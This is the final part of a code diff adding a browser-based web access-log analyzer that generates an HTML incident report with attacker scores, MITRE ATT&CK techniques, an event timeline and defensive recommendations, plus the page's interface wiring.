+      h += `<tr><td class="mono">${esc(ipStr)}</td><td><strong>${s.score}</strong></td><td>${fmtInt(s.n)}</td><td class="small">${beh||"—"}</td><td class="small">${sig||"—"}</td></tr>`;
+    });
+    h += `</table>`;
+  }
+
+  h += H("MITRE ATT&CK Techniques Observed");
+  if (!techniques.length) h += `<p class="muted">None.</p>`;
+  else { h += `<table><tr><th>Technique</th><th>Tactic</th><th>Events</th></tr>`;
+    techniques.forEach(t => h += `<tr><td><span class="mono">${esc(t.id)}</span> ${esc(t.name)}</td><td>${esc(t.tactic)}</td><td>${fmtInt(t.count)}</td></tr>`);
+    h += `</table>`; }
+
+  h += H("Significant Events");
+  if (!timeline.length) h += `<p class="muted">No timestamped critical/high events.</p>`;
+  else { h += `<table><tr><th>Time (UTC)</th><th>Sev</th><th>Detection</th><th>Source</th><th>Request</th><th>Status</th></tr>`;
+    timeline.slice(0,20).forEach(e => h += `<tr><td class="mono small">${esc(fmtISO(e.ts))}</td><td>${sevBadge(e.sev)}</td><td>${esc(e.label)}</td><td class="mono small">${esc(e.ip)}</td><td class="mono small">${esc((e.url||"").slice(0,70))}</td><td>${e.status||"—"}</td></tr>`);
+    h += `</table>`; }
+
+  h += H("Recommendations");
+  h += `<ul class="rec">`;
+  if (!recs.length) h += `<li>No critical/high categories fired — maintain current controls and monitoring.</li>`;
+  recs.slice(0,14).forEach(r => h += `<li>${sevBadge(r.sev)} <strong>${esc(r.label)}:</strong> ${esc(r.text)}</li>`);
+  if (intel.dos.length) h += `<li>${sevBadge("high")} <strong>Denial of service:</strong> front the service with a CDN/WAF that enforces per-endpoint rate limits and challenge pages; add autoscaling and 5xx-rate alerting for the targeted endpoints.</li>`;
+  h += `<li>${sevBadge("high")} <strong>Restore source-IP visibility:</strong> log <span class="mono">X-Forwarded-For</span> at the load balancer so external client IPs appear in VEHCS access logs.</li>`;
+  h += `<li>${sevBadge("medium")} <strong>Capture request bodies:</strong> access logs omit POST bodies — enable WAF full-request or application-layer logging to see credentials, uploads and form-field payloads.</li>`;
+  h += `</ul>`;
+
+  h += H("Scope, Methodology &amp; Limitations");
+  h += `<table><tr><th>File</th><th>Size</th><th>Format</th><th>Lines</th><th>Parsed</th><th>Unparsed</th></tr>`;
+  Files.list.forEach(f => h += `<tr><td class="mono small">${esc(f.name)}</td><td>${fmtBytes(f.size)}</td><td>${esc(f.format||"—")}</td><td>${fmtInt(f.lines||0)}</td><td>${fmtInt(f.parsed||0)}</td><td>${fmtInt(f.skipped||0)}</td></tr>`);
+  h += `</table>`;
+  h += `<p class="small muted">Detection combines ${RULES.filter(r=>r.pattern).length} per-row content signatures and ${RULES.filter(r=>r.behavioural).length} behavioural analytics with a decoding-aware extended engine covering ${EXT_SIGS.length} additional attack classes (XXE, deserialization, NoSQL/LDAP/XPath injection, prototype pollution, GraphQL abuse, cloud-metadata SSRF, secret exposure, advanced RCE and more) evaluated through URL, double-URL, unicode and base64 decoding. A statistical DoS/DDoS engine analyses the request timeline (median+MAD baseline) for volumetric and application-layer floods, and a correlation engine fuses signatures, behaviour, reconstructed actors and DoS windows into incidents. All processing is local to the browser; nothing leaves this machine. Parsed ${fmtInt(parsedTotal)} of ${fmtInt(parsedTotal+skipTotal)} lines. <strong>Limitations:</strong> access logs contain no POST bodies (body payloads are invisible), and without X-Forwarded-For the true external client IP cannot be determined.${intel.error?" Advanced-layer note: "+esc(intel.error)+".":""}</p>`;
+
+  h += `<div class="foot">Generated by VEHCS Log Analyzer — Forensic Console · ${esc(now.toISOString())} · Client-side, zero telemetry. For authorised security personnel only.</div>`;
+
+  return `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>VEHCS Incident Report — ${esc(fmtISO(now.getTime()))}</title><style>${css}</style></head><body><div class="page">${h}</div></body></html>`;
+}
+
+function download(blob, name){
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement("a");
+  a.href = url; a.download = name; document.body.appendChild(a); a.click();
+  setTimeout(() => { URL.revokeObjectURL(url); a.remove(); }, 1500);
+}
+
+/* ------------------------------------------------------------- bootstrap -- */
+(function boot(){
+  Strip.init();
+  UI.renderHead();
+  UI.renderFacets();
+
+  document.getElementById("examples").innerHTML = EXAMPLES.map((e, i) => '<button data-i="' + i + '"></button>').join("");
+  document.querySelectorAll("#examples button").forEach(b => {
+    const q = EXAMPLES[+b.dataset.i];
+    b.textContent = q;
+    b.addEventListener("click", () => UI.setQuery(q));
+  });
+
+  const fi = document.getElementById("fileInput");
+  fi.addEventListener("change", e => { Ingest.add(e.target.files); fi.value = ""; });
+  document.getElementById("btnAdd").addEventListener("click", () => fi.click());
+  document.getElementById("btnDemo").addEventListener("click", loadDemo);
+  document.getElementById("btnDemo2").addEventListener("click", e => { e.preventDefault(); e.stopPropagation(); loadDemo(); });
+  document.getElementById("btnReset").addEventListener("click", () => UI.reset());
+
+  const drop = document.getElementById("drop");
+  ["dragenter","dragover"].forEach(t => drop.addEventListener(t, e => { e.preventDefault(); drop.classList.add("hot"); }));
+  ["dragleave","drop"].forEach(t => drop.addEventListener(t, e => { e.preventDefault(); drop.classList.remove("hot"); }));
+  drop.addEventListener("drop", e => { if (e.dataTransfer && e.dataTransfer.files.length) Ingest.add(e.dataTransfer.files); });
+  window.addEventListener("dragover", e => e.preventDefault());
+  window.addEventListener("drop", e => e.preventDefault());
+
+  const q = document.getElementById("q");
+  let qt = null;
+  q.addEventListener("input", () => { clearTimeout(qt); qt = setTimeout(() => UI.applyFilters(), 260); });
+  q.addEventListener("keydown", e => { if (e.key === "Enter"){ clearTimeout(qt); UI.applyFilters(); } });
+  document.getElementById("btnRun").addEventListener("click", () => UI.applyFilters());
+  document.getElementById("btnClearQ").addEventListener("click", () => { q.value = ""; UI.applyFilters(); });
+  document.getElementById("btnCsv").addEventListener("click", () => UI.exportCSV());
+  document.getElementById("btnNdjson").addEventListener("click", () => UI.exportNDJSON());
+  document.getElementById("btnReport").addEventListener("click", () => UI.exportReport());
+  document.getElementById("btnData").addEventListener("click", () => UI.exportData());
+
+  document.getElementById("vp").addEventListener("scroll", () => UI.paint(), { passive:true });
+  document.getElementById("rows").addEventListener("click", e => {
+    const row = e.target.closest(".trow");
+    if (row) UI.openRow(+row.dataset.row);
+  });
+  document.getElementById("btnCloseDrawer").addEventListener("click", () => UI.closeDrawer());
+
+  document.addEventListener("keydown", e => {
+    if (e.key === "/" && document.activeElement !== q){ e.preventDefault(); q.focus(); q.select(); }
+    if (e.key === "Escape"){ UI.closeDrawer(); }
+  });
+
+  let rt = null;
+  window.addEventListener("resize", () => {
+    clearTimeout(rt);
+    rt = setTimeout(() => { if (Store.n){ Strip.build(); UI.renderCharts(); UI.renderTable(); } }, 180);
+  });
+
+  UI.liveStats();
+})();
+</script>
+</body>
+</html>
